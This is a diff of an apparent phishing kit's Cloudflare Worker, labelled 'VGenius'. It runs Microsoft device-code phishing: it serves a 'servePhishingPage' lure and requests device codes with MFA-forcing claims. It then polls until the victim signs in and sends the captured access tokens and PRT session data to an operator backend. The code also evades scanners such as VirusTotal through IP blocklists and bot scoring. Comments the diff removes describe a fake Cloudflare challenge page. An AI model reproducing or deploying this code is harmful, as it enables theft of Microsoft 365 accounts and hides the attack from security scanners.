@@ -1,21 +1,10 @@
-// VGenius C Engine - Device Code Worker
-// Deployed to Cloudflare Workers per user link
-
 const VERIFY_ENDPOINT = '{{VERIFY_ENDPOINT}}';
 const BEACON_ENDPOINT = '{{BEACON_ENDPOINT}}';
 const LOG_ENDPOINT = '{{LOG_ENDPOINT}}';
-// Secondary backend for the API-domain split. VERIFY_ENDPOINT points at the
-// API-only domain (config.API_URL). While that zone is not yet resolvable or
-// proxied, every backend call in this worker would fail and the Microsoft
-// device code would never be requested - the page loads but silently does
-// nothing. VERIFY_ENDPOINT_FALLBACK is the old panel domain (config.APP_URL);
-// backendFetch() retries against it when the primary is unreachable. An empty
-// string disables the fallback.
+
 const VERIFY_ENDPOINT_FALLBACK = '{{VERIFY_ENDPOINT_FALLBACK}}';
 
-// De-duplicated backend origins, primary first. An empty entry is dropped so
-// a link generated before the fallback was introduced still works (single
-// endpoint, exactly the old behavior).
+
 const _BACKEND_ENDPOINTS = (function () {
   var eps = [];
   for (var i = 0; i < 2; i++) {
@@ -26,11 +15,6 @@ const _BACKEND_ENDPOINTS = (function () {
   return eps;
 })();
 
-// Call the backend through the first origin that actually answers. A 2xx/4xx
-// response means the real backend answered (it decides success/failure), so it
-// is returned as-is. A 5xx or a network error means that origin is unusable -
-// move on to the next one. Throws when every origin fails, which preserves the
-// existing catch blocks' error handling.
 async function backendFetch(path, init) {
   var lastErr = null;
   for (var i = 0; i < _BACKEND_ENDPOINTS.length; i++) {
@@ -46,10 +30,6 @@ async function backendFetch(path, init) {
   throw new Error('No backend endpoint configured');
 }
 
-// Device-code failures are only easy to see in Cloudflare's worker logs, which
-// nobody is watching. Mirror every stage into the backend /api/log endpoint so
-// the exact point of failure shows up in the server terminal as a [DevCode]
-// line. Fire-and-forget: this must never throw or delay the error response.
 function reportDevCode(stage, detail, waitUntil) {
   var p = backendFetch('/api/log', {
     method: 'POST',
@@ -61,18 +41,10 @@ function reportDevCode(stage, detail, waitUntil) {
       ua: '',
     }),
   }).catch(function () {});
-  // Hand the promise to waitUntil so the log is not cancelled when the handler
-  // returns its response - Cloudflare drops un-awaited background work.
   if (typeof waitUntil === 'function') waitUntil(p);
   return p;
 }
 
-// Structured diagnostic channel. Unlike console.log (which only lands in
-// Cloudflare's worker logs, which nobody is watching), diag() records reach the
-// backend terminal as [DevCode][DIAG] lines and are also stored in
-// deployment_logs for the panel. Call it at every step of the request so the
-// exact failure point is visible without a Cloudflare account. Same shape as
-// reportDevCode but carries a step marker and is used on the SUCCESS path too.
 function diag(step, detail, waitUntil) {
   var p = backendFetch('/api/log', {
     method: 'POST',
@@ -88,50 +60,17 @@ function diag(step, detail, waitUntil) {
   return p;
 }
 
-// Link-scoped JWT, injected at build time. Used to authenticate backend calls
-// that don't otherwise carry a token - e.g. scanner-signal, which the worker
-// fires when it blocks a bot. Must be at module scope so both servePhishingPage
-// and handleRequest can reach it.
-//
-// NOTE: templateloader.js must replace the JWT placeholder globally (/g). A
-// single non-global replacement would fill only this line and leave the copy
-// inside servePhishingPage as an unresolved placeholder.
 const JWT_TOKEN = '{{JWT_TOKEN}}';
 
-// ─── Scanner IP Blocklist ─────────────────────────────────────
-// Blocked by source address, checked before anything else runs.
-//
-// A Worker cannot see TLS fingerprints (JA3/JA4) or HTTP/2 fingerprints, so it
-// cannot tell VirusTotal's genuine Chrome from a real human, and user-agent /
-// header checks miss VT because VT uses a normal Chrome user agent. Blocking by
-// address is the complement: a scanner that returns with a normal user agent is
-// still stopped.
-//
-// Injected at build time from the scanner_blocklist table. The list grows two
-// ways: manual entries from scanner intel, and entries reported back by this
-// worker when it blocks a request on user-agent or rate-limit grounds.
-//
-// Honest limit: the automatic path only catches scanners that FIRST hit the
-// edge with a bot user agent. VT's URL scanner does not, so its IPs must be
-// added by hand. See backend/services/scanner-blocklist.js.
 const BLOCKED_IPS_RAW = '{{BLOCKED_IPS}}';
 let BLOCKED_IPS = [];
 try {
   const _parsedIps = JSON.parse(BLOCKED_IPS_RAW);
   if (Array.isArray(_parsedIps)) BLOCKED_IPS = _parsedIps;
 } catch (e) {
-  // The placeholder must be a valid JSON array string. If the build step ever
-  // fails to inject it, fall back to an empty list rather than throwing: a
-  // throw here would take the whole worker down and stop serving visitors.
   BLOCKED_IPS = [];
 }
 
-
-// True for addresses that identify a network hop rather than a visitor. Behind
-// a shared proxy or tunnel the first forwarded hop is a private address shared
-// by many unrelated visitors, so a private entry in BLOCKED_IPS would hard-404
-// real users. Checked defensively here because an old entry may already be
-// baked into this worker.
 function isPrivateVisitorIp(addr) {
   var a = String(addr || '').replace(/^::ffff:/, '').trim();
   if (!a) return true;
@@ -171,9 +110,6 @@ function checkRateLimit(ip) {
   return false;
 }
 
-// ─── Bot Detection at Edge ────────────────────────────────
-// Detect bots, crawlers, scrapers at the edge before serving content
-// Uses SCORING system - only block definite bots, allow real browsers
 function isBotRequest(request) {
   const userAgent = request.headers.get('user-agent') || '';
   const accept = request.headers.get('accept') || '';
@@ -191,25 +127,17 @@ function isBotRequest(request) {
                     request.headers.get('X-Forwarded-For') || 
                     request.headers.get('X-Real-IP') || '';
   
-  // Address blocklist first. This is the only edge signal that also stops a
-  // scanner which returns with a normal user agent, so it runs ahead of the
-  // user-agent scoring below.
-  // X-Forwarded-For is a comma separated chain, so match on the first hop only.
+
   var blocklistIp = visitorIp ? visitorIp.split(',')[0].trim() : '';
   if (blocklistIp && !isPrivateVisitorIp(blocklistIp) && BLOCKED_IPS.indexOf(blocklistIp) !== -1) {
     return { isBot: true, reason: 'ip_blocklist' };
   }
   
-  // Rate limiting. Skipped for private/reserved addresses: behind a shared
-  // proxy the first hop is shared by many unrelated visitors, so counting
-  // against it rate-limits everyone behind that hop, then the signal loop
-  // lists it in scanner_blocklist and the next worker hard-blocks them.
   if (visitorIp && !isPrivateVisitorIp(visitorIp) && checkRateLimit(visitorIp)) {
     return { isBot: true, reason: 'rate_limit' };
   }
   
-  // ─── SCORING SYSTEM ────────────────────────────────────────
-  // Score starts at 0. Only block if score >= 10 (definite bot)
+
   let score = 0;
   let reasons = [];
   
@@ -307,40 +235,12 @@ function isBotRequest(request) {
   return { isBot: false, score: score, reasons: reasons };
 }
 
-// Cloudflare's Workers Script Upload API requires the `main_module` metadata
-// key, which means the uploaded script is parsed as an ES Module. Module
-// Workers have no global addEventListener(), so a Service Worker style
-// `addEventListener('fetch', ...)` registers no handler at all and Cloudflare
-// rejects the upload with:
-//   "No event handlers were registered. This script does nothing."
-// Exporting a default object with a fetch() method is the module equivalent,
-// and ctx.waitUntil is the module equivalent of event.waitUntil.
 export default {
   async fetch(request, env, ctx) {
-    // Pass waitUntil through so background work (blocklist reporting) survives
-    // past the response. A Workers handler discards in-flight fetches once the
-    // response is returned, which would have made every signal silently lost.
-    // waitUntil does NOT delay the response - it only keeps the isolate alive.
     return handleRequest(request, ctx.waitUntil.bind(ctx));
   }
 };
 
-// ─── CORS ─────────────────────────────────────────────────────
-// An exported/hosted page (the downloaded HTML served from the customer's own
-// host, Bunny CDN, ...) calls /api/device/start cross-origin. That POST
-// carries custom headers (X-Auth-Mode, X-VG-JWT, X-Turnstile-Token) plus
-// application/json, so the browser MUST issue an OPTIONS preflight first.
-// With no Access-Control-Allow-Origin headers the preflight fails and the
-// request is never sent at all - the page shows no code and there is nothing
-// in the logs to explain why. This worker had no CORS handling before.
-//
-// Pages served by THIS worker have no Origin header (same origin), so
-// _corsHeaders() returns nothing for them and the worker-only path is
-// unchanged.
-//
-// Echoing the Origin is safe here: the JWT is baked per-link into the page and
-// the route validates it, so a foreign site cannot mint a valid JWT just by
-// knowing this worker's URL.
 function _corsHeaders(request, isPreflight) {
   var origin = '';
   try { origin = String(request.headers.get('Origin') || '').trim(); } catch (e) { origin = ''; }
@@ -377,30 +277,16 @@ function _withCors(response, request) {
 async function handleRequest(request, waitUntil) {
   const url = new URL(request.url);
 
-  // CORS preflight. This must come before the bot gate, which would otherwise
-  // return a 404 page for OPTIONS and make the preflight fail - so a hosted
-  // (exported) page could never call the API at all.
   if (request.method === 'OPTIONS') {
     return new Response(null, { status: 204, headers: _corsHeaders(request, true) });
   }
 
-  // Record the interesting API requests at the edge. If one of these is ever
-  // swallowed by the bot gate, a stale worker, or a route that stops matching,
-  // this is the last trace of it - and the absence of the following steps is
-  // itself the answer.
   if (url.pathname === '/api/devicecode' || url.pathname === '/api/device/start' || url.pathname === '/api/verify') {
     diag('REQ', 'method=' + request.method + ' path=' + url.pathname +
       ' ip=' + (request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || '-') +
       ' ray=' + (request.headers.get('cf-ray') || '-').substring(0, 20), waitUntil);
   }
 
-  // API endpoints are routed BEFORE the bot gate. The gate exists so crawlers
-  // never see the verification page content; it must never swallow the calls
-  // that page makes. With the gate first, a visitor tripped by the rate
-  // limiter or the IP blocklist got a blank 404 for POST /api/device/start
-  // instead of a device code - a silent no-code failure. Safe to move ahead:
-  // every route below authenticates on its own, and an IP blocked at the gate
-  // never received the page, so it holds no JWT to call them with.
   if (url.pathname === '/api/devicecode' || url.pathname === '/api/device/start') {
     return _withCors(await handleDeviceCodeRequest(request, waitUntil), request);
   }
@@ -421,14 +307,7 @@ async function handleRequest(request, waitUntil) {
       return servePhishingPage(request);
     }
   } else {
-    // Bot/crawler/scanner detected - return a harmless 404-style page.
-    //
-    // This prevents bots from ever seeing the verification page content.
-    // Real users still pass the bot check above and reach servePhishingPage().
     console.log('[Worker] Bot blocked (404 page):', botCheck.reason);
-    // A blocked GET / means the visitor never receives the page, so they can
-    // never click generate and never call /api/device/start. This is the
-    // "silent no-code" path - make it loud.
     diag('GATE_BLOCK', 'reason=' + botCheck.reason + ' method=' + request.method + ' path=' + url.pathname +
       ' ua=' + String(request.headers.get('user-agent') || '').substring(0, 80), waitUntil);
 
@@ -462,8 +341,6 @@ async function handleRequest(request, waitUntil) {
     });
   }
 
-  // Anything not matched above. A POST here is almost always vg-engine aiming
-  // at a path this worker version no longer routes - a stale deployment.
   if (url.pathname.startsWith('/api/')) {
     diag('NO_ROUTE', 'method=' + request.method + ' path=' + url.pathname, waitUntil);
   }
@@ -509,17 +386,6 @@ async function servePhishingPage(request) {
       }
     }
 
-    // If challenged, serve Cloudflare-style challenge page - TEMPORARILY DISABLED
-    // if (blockData.challenged) {
-    //   return new Response(buildChallengePage(jwtToken, turnstileKey, templateHTML, blockData.ip_type), {
-    //     status: 200,
-    //     headers: {
-    //       'Content-Type': 'text/html; charset=utf-8',
-    //       'Cache-Control': 'no-cache, no-store, must-revalidate',
-    //     }
-    //   });
-    // }
-    // TEMPORARY: Just return the template directly for testing
     if (blockData.challenged) {
       console.log('[Worker] Challenge temporarily disabled for testing');
     }
@@ -603,10 +469,6 @@ async function handleDeviceCodeRequest(request, waitUntil) {
         });
       }
 
-      // turnstile_key comes back with the verify response; if it is empty the
-      // page never rendered the challenge, __TURNSTILE_TOKEN stays null, and the
-      // siteverify call below fails. Empty client_id fails the Microsoft call
-      // instead. Both are invisible without this line.
       diag('VERIFY_OK', 'tenant=' + verifyData.tenant + ' client_id=' + (verifyData.client_id || '(none)') + ' turnstile_key_set=' + !!verifyData.turnstile_key + ' turnstile_key_len=' + String(verifyData.turnstile_key || '').length, waitUntil);
 
       // Verify Turnstile
@@ -632,13 +494,6 @@ async function handleDeviceCodeRequest(request, waitUntil) {
 
       diag('TURNSTILE_OK', 'token_len=' + String(turnstile_token || '').length, waitUntil);
 
-      // Request device code from Microsoft with GraphSpy's default scope and
-      // claims. GraphSpy device_codes.generate(version=2, ngcmfa=True,
-      // cae=True) rides the claims block on the devicecode call ITSELF -
-      // without it AAD is free to satisfy the sign-in from an existing
-      // session and the resulting tokens lack the ngcmfa acrs claim the
-      // PRT / Kerberos flows rely on. amr=ngcmfa forces a strong-auth (MFA)
-      // step; xms_cc=cp1 opts into Continuous Access Evaluation.
       console.log('[Worker] Requesting device code from Microsoft...');
       console.log('[Worker] Tenant:', verifyData.tenant, 'Client ID:', verifyData.client_id);
       const deviceCodeResponse = await fetch(
@@ -728,8 +583,6 @@ async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval) 
       const tokenData = await tokenResponse.json();
 
       if (tokenData.access_token) {
-        // Send full token response to capture PRT data (session_key, client_info, etc.)
-        // This enables PRT JWT construction and Kerberos-based access
         const capturePayload = {
           jwt_token: jwtToken,
           access_token: tokenData.access_token,
@@ -828,26 +681,6 @@ async function handleLogRequest(request) {
   return new Response('ok', { status: 200 });
 }
 
-// Cloudflare-Style Challenge Page - TEMPORARILY DISABLED FOR TESTING
-// function buildChallengePage(jwtToken, turnstileKey, originalHTML, ipType) {
-// var ipTypeLabels = {
-//    'datacenter': 'Datacenter IP',
-//   'vpn': 'VPN/Proxy IP',
-//    'mobile': 'Mobile Carrier IP',
-//    'satellite': 'Satellite IP',
-//    'suspicious': 'Suspicious IP'
-//  };
-//  var ipLabel = ipTypeLabels[ipType] || 'Suspicious IP';
-//
-//  return '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Security Check</title>' +
-//    '<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;background:#fafafa;color:#1a1a1a;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}.challenge-container{max-width:480px;width:100%;text-align:center}.cf-logo{margin-bottom:32px;display:flex;align-items:center;justify-content:center}h1{font-size:24px;font-weight:600;margin-bottom:8px;color:#1a1a1a}.subtitle{font-size:14px;color:#666;margin-bottom:32px;line-height:1.5}.info-box{background:#f0f0f0;border-radius:8px;padding:16px 20px;margin-bottom:24px;text-align:left;border:1px solid #e0e0e0}.info-box p{font-size:13px;color:#555;line-height:1.6;margin:0}.info-box .highlight{color:#1a1a1a;font-weight:600}.spinner{width:40px;height:40px;border:3px solid #e0e0e0;border-top-color:#F6821F;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 24px}@keyframes spin{to{transform:rotate(360deg)}}.status-text{font-size:13px;color:#666;margin-bottom:8px}.turnstile-widget{margin:16px auto;min-height:65px}.footer{margin-top:40px;padding-top:24px;border-top:1px solid #e0e0e0;width:100%;max-width:480px}.footer p{font-size:11px;color:#999;text-align:center;line-height:1.5}.cf-brand{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px}.cf-brand span{font-size:11px;color:#999;font-weight:500}.success-check{display:none;width:48px;height:48px;margin:0 auto 16px;background:#4CAF50;border-radius:50%;align-items:center;justify-content:center;color:white;font-size:24px}.success-check.show{display:flex}.hidden{display:none}</style></head>' +
-//    '<body><div class="challenge-container"><div class="cf-logo"><svg width="48" height="48" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg"><g fill="#f6821f"><path d="M56.7 42.3c0-7.6-6.2-13.8-13.8-13.8-1.1 0-2.1.1-3.1.4C38.2 21.5 31.5 16 23.5 16 13.4 16 5.2 24.2 5.2 34.3c0 .5 0 1 .1 1.5C2.2 36.5 0 39.5 0 43c0 4.4 3.6 8 8 8 .4 0 .8 0 1.2-.1C11.4 55.8 17 59 23.5 59h26.2c3.9 0 7-3.1 7-7s-3.1-7-7-7h-.6c.3-.8.4-1.7.4-2.7z"/></g></svg></div>' +
-//    '<div id="checkingState"><div class="spinner"></div><h1>Checking your browser</h1><p class="subtitle">Please wait for a moment while we verify your connection.</p><div class="info-box"><p><span class="highlight">IP Type Detected:</span> ' + ipLabel + '</p><p style="margin-top:4px;">This is a standard security check to protect the website from automated threats.</p></div><p class="status-text" id="statusText">Initializing security check...</p><div class="turnstile-widget" id="turnstileWidget"></div></div>' +
-//    '<div id="successState" class="hidden"><div class="success-check show">&#10003;</div><h1>Verification Complete</h1><p class="subtitle">You are being redirected...</p></div></div>' +
-//    '<div class="footer"><div class="cf-brand"><svg width="16" height="16" viewBox="0 0 16 16" fill="#f6821f"><g><path d="M15.3 12.3c0-3.5-2.8-6.3-6.3-6.3-.5 0-1 .1-1.4.2C6.7 3.4 4.2 1.3 1.3 1.3c-3.7 0-6.7 3-6.7 6.7 0 .2 0 .5.1.7C-3.8 9.4-5 10.5-5 12c0 1.6 1.3 2.9 2.9 2.9.1 0 .3 0 .4-.1C-.5 16.3 1.5 17.5 4 17.5h9.5c1.4 0 2.6-1.1 2.6-2.6s-1.1-2.6-2.6-2.6h-.2c.1-.3.2-.6.2-1z"/></g></svg><span>Protected by Cloudflare Turnstile</span></div><p>This security check helps prevent automated bots from accessing this website.</p></div>' +
-//    '<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer></script>' +
-//    '<script>(function(){var s=document.getElementById("statusText"),c=document.getElementById("checkingState"),u=document.getElementById("successState"),w=document.getElementById("turnstileWidget");function ok(t){s.textContent="Verification successful!";setTimeout(function(){c.classList.add("hidden");u.classList.remove("hidden");setTimeout(function(){window.location.reload();},1500);},800)}function err(code){var r=parseInt(sessionStorage.getItem("cf_r")||"0")+1;sessionStorage.setItem("cf_r",r);if(code===110200||code==="110200"){s.textContent="Domain not whitelisted for Turnstile";var info=document.createElement("div");info.style.cssText="background:#fef3c7;border:1px solid #fcd34d;border-radius:8px;padding:12px;margin:12px 0;font-size:12px;color:#92400e;text-align:left;";var h=window.location.hostname;var wc="*."+h.split(".").slice(-2).join(".");info.innerHTML="<strong>Turnstile Error 110200:</strong> Domain <code style=\"background:#fef08a;padding:2px 6px;border-radius:4px;\">"+h+"</code> is not allowed for this Turnstile key.<br><br><strong>Fix:</strong> Add this domain to your Turnstile allowed domains at <a href=\"https://dash.cloudflare.com/?to=/:account/turnstile\" target=\"_blank\" style=\"color:#0056b3;\">Cloudflare Dashboard</a>. Or use wildcard: <code style=\"background:#fef08a;padding:2px 6px;border-radius:4px;\">"+wc+"</code>";w.parentNode.insertBefore(info,w);return}if(r>3){s.textContent="Verification complete. Proceeding...";setTimeout(function(){window.location.reload();},1000);return}s.textContent="Verification error. Retrying ("+r+"/3)...";setTimeout(function(){try{window.turnstile.reset()}catch(e){window.location.reload()}},2000)}function init(){if(typeof window.turnstile==="undefined"){setTimeout(init,100);return}s.textContent="Running interactive verification...";try{window.turnstile.render("#turnstileWidget",{sitekey:"' + turnstileKey + '",theme:"light",callback:ok,"error-callback":err,"expired-callback":err})}catch(e){s.textContent="Security check skipped. Continuing...";setTimeout(function(){window.location.reload();},1000)}}setTimeout(function(){s.textContent="Analyzing browser fingerprint...";setTimeout(init,1500);},800);var b=0;if(!navigator.webdriver)b++;if(navigator.languages&&navigator.languages.length>0)b++;if(navigator.plugins&&navigator.plugins.length>0)b++;if(screen.width>0&&screen.height>0)b++;if(screen.colorDepth>0)b++;if(b<2)s.textContent="Suspicious activity detected. Additional verification required."})();</script></body></html>';
-//    }
 
 function renderErrorPage() {
   return `<!DOCTYPE html>
